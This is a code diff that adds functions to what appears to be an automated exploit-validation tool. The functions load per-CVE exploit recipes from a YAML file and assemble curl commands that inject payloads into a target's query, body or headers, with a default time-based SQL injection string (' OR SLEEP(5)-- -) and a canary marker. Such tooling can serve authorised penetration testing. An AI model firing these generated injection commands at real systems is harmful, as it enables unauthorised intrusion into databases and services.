@@ -16551,6 +16551,106 @@ def _spec_injection_probe(base, spec, token, resolved, timeout=25):
     return confirmed
 
 
+_CVE_SPECS_CACHE = None
+
+
+def _load_cve_exploit_specs():
+    """Load knowledge/cve_exploit_specs.yaml (cached) — per-CVE exploit recipes."""
+    global _CVE_SPECS_CACHE
+    if _CVE_SPECS_CACHE is not None:
+        return _CVE_SPECS_CACHE
+    import yaml as _yaml
+    _kd = os.environ.get("KNOWLEDGE_DIR", "/knowledge")
+    for p in (os.path.join(_kd, "cve_exploit_specs.yaml"),
+              os.path.join(os.path.dirname(__file__), "..", "knowledge", "cve_exploit_specs.yaml"),
+              "knowledge/cve_exploit_specs.yaml"):
+        try:
+            with open(p, encoding="utf-8") as f:
+                _CVE_SPECS_CACHE = (_yaml.safe_load(f) or {}).get("specs") or []
+                return _CVE_SPECS_CACHE
+        except Exception:  # noqa: BLE001
+            continue
+    _CVE_SPECS_CACHE = []
+    return _CVE_SPECS_CACHE
+
+
+def _cve_exploit_spec(cve):
+    if not cve:
+        return None
+    cu = str(cve).upper()
+    for s in _load_cve_exploit_specs():
+        if str(s.get("cve", "")).upper() == cu:
+            return s
+    return None
+
+
+def _sh_q(s):
+    """Single-quote a string for safe shell inclusion."""
+    return "'" + str(s).replace("'", "'\"'\"'") + "'"
+
+
+def _curl_from_cve_spec(ip, port, req, payload):
+    """Build a curl command from a per-CVE request spec, injecting `payload` at
+    the {INJ} marker in query/body/headers. Supports any method + form/json/xml."""
+    import urllib.parse as _u, json as _json
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    method = (req.get("method") or "GET").upper()
+    ct = (req.get("content_type") or "").lower()
+
+    def sub(v):
+        return v.replace("{INJ}", payload) if isinstance(v, str) else v
+    query = {k: sub(v) for k, v in (req.get("query") or {}).items()}
+    raw_body = req.get("body")
+    body = ({k: sub(v) for k, v in raw_body.items()} if isinstance(raw_body, dict)
+            else sub(raw_body))
+    headers = {k: sub(v) for k, v in (req.get("headers") or {}).items()}
+    url = base + (req.get("path") or "/")
+    if query:
+        url += ("&" if "?" in url else "?") + _u.urlencode(query)
+    parts = ["curl", "-s", "-k"]
+    if method != "GET":
+        parts += ["-X", method]
+    for k, v in headers.items():
+        parts += ["-H", _sh_q(f"{k}: {v}")]
+    if body is not None and body != {}:
+        if ct == "json":
+            parts += ["-H", _sh_q("Content-Type: application/json"),
+                      "-d", _sh_q(_json.dumps(body) if isinstance(body, dict) else body)]
+        elif ct == "xml":
+            parts += ["-H", _sh_q("Content-Type: application/xml"),
+                      "--data", _sh_q(body if isinstance(body, str) else str(body))]
+        else:  # form (default)
+            enc = _u.urlencode(body) if isinstance(body, dict) else str(body)
+            parts += ["-d", _sh_q(enc)]
+    parts += [_sh_q(url)]
+    return " ".join(parts)
+
+
+def _assemble_from_cve_spec(cve, ip, port, canary):
+    """Build the FIRST synth command from a per-CVE exploit spec (endpoint +
+    vector + payload). Returns {command, assertion, origin} or None. Takes
+    precedence over the confirmed-facts assembler when a CVE spec exists."""
+    spec = _cve_exploit_spec(cve)
+    if not spec or spec.get("transport", "http") != "http":
+        return None
+    inj = spec.get("injection") or {}
+    tmpl = inj.get("payload_template") or "' OR SLEEP({N})-- -"
+    payload = tmpl.replace("{N}", "5")
+    if canary:
+        payload = payload + f" -- {canary}" if "--" not in payload else payload.replace(
+            "-- -", f"-- {canary}")
+    try:
+        cmd = _curl_from_cve_spec(ip, port, spec.get("request") or {}, payload)
+    except Exception:  # noqa: BLE001
+        return None
+    a = dict(spec.get("assertion") or {"min_seconds": 5, "max_seconds": 30})
+    if canary:
+        a["canary"] = canary
+        a["cve_anchored"] = True
+    return {"command": cmd, "assertion": a, "origin": f"cve_spec:{cve}"}
+
+
 def _assemble_confirmed_poc_command(ip, port, product, canary, auth=None):
     """ENHANCEMENT 1: build the FIRST PoC command from CONFIRMED pieces — the
     probed injection vector (carrier + endpoint), the resolved object-ids, and
